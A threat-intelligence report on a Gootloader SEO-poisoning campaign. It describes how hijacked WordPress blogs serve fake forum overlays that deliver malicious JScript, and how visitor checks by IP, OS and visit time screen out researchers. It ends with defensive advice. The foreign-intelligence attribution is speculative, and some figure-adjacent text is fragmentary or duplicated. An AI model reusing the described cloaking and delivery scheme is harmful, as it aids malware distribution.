Is Gootloader Working With a Foreign Intelligence Service?

In late August, Deepwatch’s Adversary
Tactics and Intelligence (ATI) group
responded to a customer incident highly
likely associated with Gootloader
threat actors using the search engine
optimization (SEO) poisoning
technique.

EXECUTIVE
SUMMARY

Our findings suggest the campaign
may have foreign intelligence
service influence through analysis
of the blog post subjects. The threat
actors used blog post titles that an
individual would search for whose
organization may be of interest to
a foreign intelligence service e.g.
“Confidentiality Agreement for
Interpreters.” The Threat Intel Team
discovered the threat actors highly
likely created 192 blog posts on one
site.
These blog posts cover topics relevant
to government, legal, healthcare, real
estate, and education. Several blog
posts are related to business and real
estate transactions in US states like
California, Washington, and Wisconsin;
while others cover topics relevant to
Australia, Canada, New Zealand, the
United Kingdom, the United States, and
other countries.

KEY FINDINGS

• The campaign appears to have foreign

intelligence service influence. We discovered
that many blog posts use keywords that an
individual would search for whose organization
may be of interest to foreign intelligence
services.
• TAC-011 highly likely created almost 200

blog posts on one site with topics ranging
from government, finance, education,
and healthcare to real estate, legal, and
transportation.
• The threat actors created the blog

posts with relevant content pieced
together from multiple sources,
spending considerable time and
effort researching and developing the
content for each blog post.
• It is estimated that TAC-011 has likely

compromised hundreds of WordPress
websites and may have produced
thousands of individual blog posts.

• TAC-011 likely utilizes a central server

that all compromised sites use to pull
content from and log the visitor’s IP
address and device OS.

SEO Poisoning
Threat actors use SEO poisoning techniques on
compromised websites or pages they create to
appear prominently in search results.
The sites may contain content that many people
are likely to use in searches at any given time,
such as phrases related to holidays, trending
news, or viral videos. However, threat actors
can be very specific with their content to target a
certain group.

One way to think about SEO poisoning is like setting a mouse trap and waiting for
the mouse to take the bait. Once the victim (mouse) finds the trap, the fake forum
(cheese) lures the victim into taking the bait. SEO poisoning contrasts with the
more prevalent initial access vectors like phishing or exploiting internet-facing
systems, which require the threat actor to find vulnerable targets.
TAC-011 & Gootloader
On August 25th, Deepwatch’s Adversary Tactics and Intelligence (ATI) group responded to a customer incident
involving the victim’s employee searching Google for specific keywords related to transition service agreements.
The user clicked on one of the search results titled, “Accounting for Transition Services Agreement | Sportrecs
Blog”, which appeared as a forum post with a link to an innocuous file the user had searched for. In reality, the file
was a malicious JScript (.js) file.
The Deepwatch Threat Intel Team tracks the threat activity cluster observed in this incident as TAC-011, which
employs SEO poisoning techniques to infect machines with various payloads. This variation involves TAC-011
compromising legitimate websites, creating fake blog posts, and using overlays to display a fake forum page over
these blog posts. Additionally, the threat actors use obfuscated JavaScript to avoid detection and analysis of the
fake forum.
The Gootloader malware, first described by Sophos in March 2021, follows the same tactics and techniques
observed in this incident.

Analyst Assessment 1

The threat actor(s) behind the Gootloader malware, tracked as TAC-011, are highly likely responsible for
this incident. The Threat Intel Team bases this assessment on the URLs found in the JScript file, the tactics,
techniques, and procedures (TTPs) used, and the fake forum’s overall design and format.

TAC-011 Diamond Model of Intrusion Analysis.

TAC-011 Campaign Analysis

The Deepwatch Threat Intel Team examined blog.sportrecs[.]com and the blog post “Accounting for Transition
Service Agreement,” as we knew that was the blog post that could result in Gootloader dropping additional
payloads on an unsuspecting visitor. At the time, sportrecs[.]com came up as benig in VirusTotal, and according to
VirusTotal, the “Popularity Ranks” for the website range anywhere from 123,000 to 312,000 (figure 1).

Figure 1: Popularity rankings for sportrecs[.]com according to VirusTotal.

According to VirusTotal’s (VT) whois lookup (figure 2), the site owners created it on 5 September 2019, last updated
it on 27 July 2022, and registered it with GoDaddy. The resolving IP address site is 188.246.233[.]180 (VT link).
This IP also resolves the domains mooscle[.]com and ruvod[.]com (VT links), and both of these domains are
benign in VT as well.

Figure 2: VirusTotal Whois lookup for sportrecs[.]com.

The site has the capability to translate blog posts into four different languages (English, Portuguese, Hebrew, and
Russian). We learned that the suspicious blog posts are translated into only three of the four languages (English,
Portuguese, and Hebrew).
Visiting the blog.sportrecs[.]com, visitors are presented with blog posts that one would expect to find on a sports
streaming distribution site (Figures 3 & 4).

Figure 3: New product updates posted on September 24, 2021.

Next, we tried to find out if there were other suspicious
blog posts on the site. To our surprise, our investigation
revealed almost 200 suspicious blog posts. If threat
actors employ SEO poisoning techniques, they may
appear in top search results.
The suspicious blog posts cover topics ranging from
government, and legal to real estate, medical, and
education. Some blog posts cover topics related to
specific legal and business questions or actions for US
states such as California, Florida, and New Jersey. Other
blog posts cover topics relevant to Australia, Canada,
New Zealand, the United Kingdom, the United States,
and other countries.

Analyst Assessment 2
TAC-011 likely compromised blog.sportrecs[.]
com website, given that all available
information points to the site being legitimate.
However, the means of compromise is
unknown, and we cannot positively confirm
that this site is legitimate.
Furthermore, the threat actors highly likely
created these blog posts, given that the
content of these blog posts is out of place and
off-topic for content that one would expect to
find on a Sports streaming service provider.

A Deeper Dive Into the Blog

From our analysis of these blog posts, we learned that they are not filled with gibberish, but are pieced together from
multiple sources. This suggests that TAC-011 has the resources and time to accomplish this task.
What is not known is how many actors comprise TAC-011. Given the herculean task of researching and creating
hundreds of blog posts, one may assume that many individuals are working together. However, this task may not be
completely unfeasible for a lone individual despite the perceived level of effort needed to do this.
During our review of these blog posts we looked at the number of posts that featured keywords like agreement,
contract, legal, etc. The chart below (figure 5) shows our findings and the threat actor’s preference for the word
“agreement.”

Figure 5: Chart displaying the number of blog posts with specific words.

Blog Subjects

We also looked at the number of posts on specific topics. The chart below (figure 6) shows that most blog posts
are of general business in nature and could target any industry. Furthermore, 40% of the blog posts cover topics
that are relevant to the professional, scientific, and technical services; real estate, rental, and leasing; finance and
insurance; transportation and warehousing; educational services; and healthcare and social assistance industries.

Figure 6: Chart displaying the number of blog posts with subjects relevant to a specific sector.

Is Gootloader Working With a Foreign Intelligence Service?

We also analyzed the number of
posts with topics relevant to specific
countries. The chart below (figure
7) shows that most blog posts are
relevant to many countries. However,
we did notice that 30% of the posts
targeted visitors searching for topics
that are relevant to the United States,
the United Kingdom, Canada,
Australia, New Zealand, and India
(map 1).
Figure 7: Chart displaying the number of blog posts with subjects relevant to a specific country.

Map 1: Map displaying targeted countries.

Analyst Assessment 3
Our findings suggest that TAC-011 likely aims to gain access to as many sectors as possible.
However, there appears to be foreign intelligence service influence as many blog posts use
keywords that an individual would search for who might have ties to an organization of interest to
a foreign intelligence service.

Is Gootloader Working With a Foreign Intelligence Service?

In the following sections, we examine four unique blog posts to highlight
how TAC-011 can target very specific groups.

Blog Post: Bilateral Air Service Agreements
The blog post “Bilateral Air Service Agreements” (figure 8), posted on January 30, 2022, explains a bilateral
agreement concerning civil aviation products imported and exported between two countries.

Figure 8: Bilateral service agreements blog post added on January 30, 2022.

An end-user may search for this information if the organization the employee works for manufactures civil aviation
products. This information may also interest college students, government officials, and employees.
These data points suggest that
possible
include:
government,

Is Gootloader Working With a Foreign Intelligence Service?

Blog Post: Ip in Government Contracts
The blog post “Ip in Government Contracts” (figure 9), posted on January 30, 2022, explains a bilateral agreement
concerning civil aviation products imported and exported between two countries.

Figure 9: Intellectual property blog post added on February 20, 2022.

Conventional government contract clauses govern IP rights, which are mandated by law when created or used as
part of a government contract. In certain situations, the government may enforce exclusive IP conditions that apply
to a particular contract. In any case, the conditions of government contracts provide a broad range of results in
terms of IP ownership and use.
An end-user may search for this if they work for a company with government contracts and are concerned about
losing IP rights, including rights to computer software programs and patents.
These data points suggest that possible targeted sectors include government and government contractors.

Blog Post: Sco Agreement on Mass Media Cooperation
The blog post “Sco Agreement on Mass Media Cooperation” (figure 10), posted on March 29, 2022, explains the
Shanghai Cooperation Organization agreement on Mass Media.

Figure 10: The mass media cooperation blog post added on March 29, 2022.

The Shanghai Cooperation Organization comprises eight member states: China, Kazakhstan, Kyrgyzstan, Russia,
Tajikistan, Uzbekistan, India, and Pakistan, and primarily involves agreements and activities relating to political,
economic, security and military, and cultural cooperation.
The mass media cooperation agreement, signed in June 2019, provides an opportunity for all the Member States to
share innovations and best practices in the field of Mass Media.
The eight-member states agreed on the following topics:
• Creating a system for the mutual and wide distribution of information.
• The cooperation among the Editorial Offices of the Mass Media and the relevant Ministries, Agencies, and Organizations
in the field of Mass Media.
• The promotion of equal and mutually beneficial cooperation between professional associations of journalists of the States,
aiding broadcast of television and radio programs and those distributed legally within the territory of the State.
• Encouraging the exchange of specialists and experience in the field of Mass Media, offering mutual assistance in training
media professionals, and promoting cooperation between scientific research and educational institutions in the area of
Mass Media.

This information may be relevant to organizations involved with mass media in any of the eight-member states,
international relations, or mass media in general. Also, this information would interest those studying international
relations or foreign affairs.
These data points suggest that possible targeted sectors include: information, education, and government.

Blog Post: What Is the Full Form of B O D M a S
The blog post titled “What Is the Full Form of B O D M a S” (figure 11), posted on April 17, explains a technique
taught to students to memorize the order of mathematical operations.
BODMAS is an acronym for Bracket Of
Division, Multiplication, Addition, and
Subtraction. It was created to aid kids in
remembering the correct sequence to carry
out mathematical operations while solving
problems.
This blog post is a perfect example of how
SEO poisoning can be very effective. As you
can see from the below screenshot (figure
12), the threat actor’s blog post is the top
result when searching for B O D M a S.
This information may be relevant to teachers,
teacher aids, parents, etc., during classroom
instruction. College students studying early
childhood education may also find this
information relevant.
These data points suggest that possible
targets include the education sector,
students, and parents.

Figure 11: B O D M a S blog post added on April 17, 2022.

Analyst Assessment 4
We estimate that TAC-011 has likely
compromised hundreds of sites and
may have produced thousands of
individual blog posts. The Threat
Intel Team bases this estimate on the
effort needed to research topics, find
content, and create the blog posts
and the time and effort to identify and
compromise those sites. .
Figure 12: Google search for B O D M a S returns the threat actor’s blog post
as the top result.

Observed Activity

TAC-011 Delivery and Infection Activity

Initial Access
The intrusion started on August 25 when an employee searched Google for “Transition services agreement” and
“accounting for transition services agreement.” The user clicked on one of the search results (figure 13), ultimately
redirecting them to a fake forum [T1189].

Figure 13: Google search result for the malicious blog post

During our analysis of blog.sportrecs[.]com [T1584.001], we observed evidence of a script that we assess (Analyst
Assessment 5) conducts visitor verification. Due to this script’s server-side nature, we cannot definitively assess
how TAC-011 decides which visitors should or should not see the fake forum. However, there is evidence that
suggests the backend completes these validation checks.
The following screenshot references a server-side script (Figure 14). Due to the server-side nature of the script, we
cannot evaluate its contents.

Is Gootloader Working With a Foreign Intelligence Service?
Figures 15 and 16 show different responses based on the verification process performed by the threat actors. For
example, figure 15 shows the response if the visitor passes the verification process, displaying the fake forum. On
the other hand, figure 16 shows no response, which causes nothing to be overlaid on the innocuous blog post if the
visitor fails the verification.

Analyst Assessment 5

Figure 16: Response if the site visitor fails the verification process.

Based on web traffic analysis and the responses generated, the Threat Intel Team assesses that TAC-011 likely uses
the script accepting the argument “a588126=2112527” for the verification process and returning or not returning the
obfuscated overlay content.
Furthermore, we have observed the file pattern of 7 character parameter = 7 character value (“a588126=2112527”) across
the compromised sites we discovered, resulting in the same obfuscated responses.
To determine what factors TAC-011 uses to verify site visitors and display the fake forum, the Threat Intel Team conducted
several tests. Our tests included using various browsers and search engines and changing our external IP address.
The Threat Intel Team also tested whether the threat actors would serve the fake forum to a visitor on one compromised site, and
subsequently serve it again to the same visitor on another.
The results appeared to indicate that visiting one of the compromised sites would allow the fake forum to be displayed once
but not on any other compromised sites that the same visitor subsequently visited (within around a 24 hour timeframe). Testing
also appeared to support the theory that these sites prevented visitors from common VPN, Tor, or other anonymizing external IP
addresses and/or non-Windows systems from loading the malicious blog post overlay containing the download delivery link.
The behavior detailed above suggests that the threat actors may employ a system that verifies if the same user (likely identified
by their external IP address per the Threat Intel Team’s testing) is attempting to visit multiple compromised sites. Using a system
like this, the threat actors can avoid discovery and data collection around the infrastructure used to deliver the malware and the
details of the malware itself.

Analyst Assessment 6

Tests reveal that TAC-011 likely does not verify the visitor’s search engine but instead checks the visitor’s external IP
address, confirms whether the device is running Windows, and verifies the last time the visitor viewed the site. By checking
the IP address, OS, and last visited time, the threat actors can prevent security researchers from identifying additional
compromised sites and ensure the malware remains accessible to potential victims.
Furthermore, our findings suggest that TAC-011 employs a central server that all compromised sites check into that logs
the visitor’s IP address, device OS, and the last visited time. The threat actors likely log additional details, but it does not
appear the threat actors use these for verification.
Once the site visitor passes these validation checks, code (figure 17) builds an overlay [T1059.007] and places it over the
innocuous blog post.

The forum shows a user named “Emma Hill” asking
for an “accounting for transitions agreement” to
download. An “Admin,” responding to the request,
provided a link to download the requested document
(figure 18).
This fake forum design is not new and was first
reported in March 2021 by Sophos (figure 19) and
observed again in May 2022 in a DFIR Report video
(figure 20) posted on YouTube and shared on their blog
post titled “SEO Poisoning – A Gootloader Story.”

file [T1059.007] titled Accounting_for_transition_services_agreement (tfxp).js (figure 21). We also discovered that TAC-011
changes the domain hosting of the Gootloader malware JScript file.

Analyst Note 1

The Threat Intel Team has observed the threat actors using various download delivery domains and the same
download.php naming pattern (<compromised_domain>/download.php?*=*=*=*) across all compromised sites
we discovered.

The user’s machine had an EDR solution deployed, blocking the file execution and
preventing follow-on malware from being dropped on the user’s device.

Javascript Analysis
The .js file is assessed as Gootloader based on open-source reporting (figure 22) of websites attributed to
Gootloader and serving second-stage payloads [T1105]. The threat actors obfuscated [T1027] the file and
attempted to contact one of three domains.

Deobfuscated output of Accounting_for_transition_services_agreement (tfxp).js. Note: URLs and timestamps have
been sanitized.
The environment variable “%USERDNSDOMAIN%,” which returns a fully qualified domain name (FQDN) of
the compromised system, will allow the threat actor(s) the ability to identify which organization they have gained
access to.
When Deepwatch attempted to contact these domains, the responses returned nothing, so we are unsure what
second-stage payload would have dropped on the end-point.

Analyst Assessment 7

The Threat Intel Team assesses that the “%USERDNSDOMAIN%” variable likely sends back the corporate
domain name (“company.com”). So, for example, if a company with a Windows Active Directory environment
and a computer logged into the organization’s network were compromised, the adversary would know that
they have access to that organization. At this point, the threat actor could sell access or drop another postexploitation tool like Cobalt Strike and move laterally in the environment.

Targeting

The user searched for transition service agreements (TSAs). Numerous companies use these agreements across
various industries during mergers and acquisitions.
TSAs help facilitate a smooth administrative transition following the sale of a portion of an organization. The selling
firm offers a package of services to the acquiring company for a predetermined time. These services include HR, IT,
accounting, finance, and other necessary infrastructure requirements.
As various organizations across numerous industries use TSAs, this campaign will likely target multiple industries.

What You Need to Do
TACTICAL AND OPERATIONAL DEFENSIVE GUIDANCE
Employees should be trained on this tactic and instructed to spot the telltale signs that they are visiting a fake
website. Training should also include identifying potentially malicious file extensions, such as *.js, and the format
and style of the phony forum (figure 18), which organizations can share with their employees.
Organizations should change file associations via Group Policy, so a text editor is used to open risky file extensions
instead of the default Microsoft Windows Based Script Host program.
Changing file associations can be accomplished through the Group Policy Management Editor and changing the
folder options “open with” settings to have specific file extensions open with an organization-approved text editor.
Organizations are encouraged to change the file associations for the following file extensions .js, .vbs, .vbe, .jse,
.hta, and .wsf.
This mitigation measure will ensure that the execution of these files when users double-click them does not occur,
as the execution of these files is abnormal in everyday business operations.
Website owners should ensure that their CMS platforms, like WordPress, are up to date and are deploying a web
application firewall. In addition, organizations should monitor their blogs for unknown content and, if found, remove
it. Also, organizations should monitor scripts and verify that they have not changed. One common access vector for
threat actors is brute forcing the admin password, ensuring the admin account default credentials are changed, and
implementing MFA may reduce this attack vector.
STRATEGIC DEFENSIVE GUIDANCE
TAC-011 uses the same forum format reported multiple times since March 2021 and utilized the same tactics
and techniques. The reuse of these techniques indicates that they remain effective and demonstrates how simple
social engineering techniques can deceive end-users. By anticipating what people will search for and using SEO
techniques, TAC-011 can target vast swathes of entire regions or narrow its focus to specific interest groups or
industries.
One possible reason that employees may turn to the web to find the templates they need is that they do not
believe or know that these templates may be available through official company resources. Ensuring that potential
templates are available and employees know how to access them may reduce the risk of this threat.
Furthermore, having a process where an employee can request specific templates may reduce their need to search
for the templates and thus fall victim to these tactics. Finally, with proper awareness training, end users can avoid
downloading malicious files if they recognize the signs.
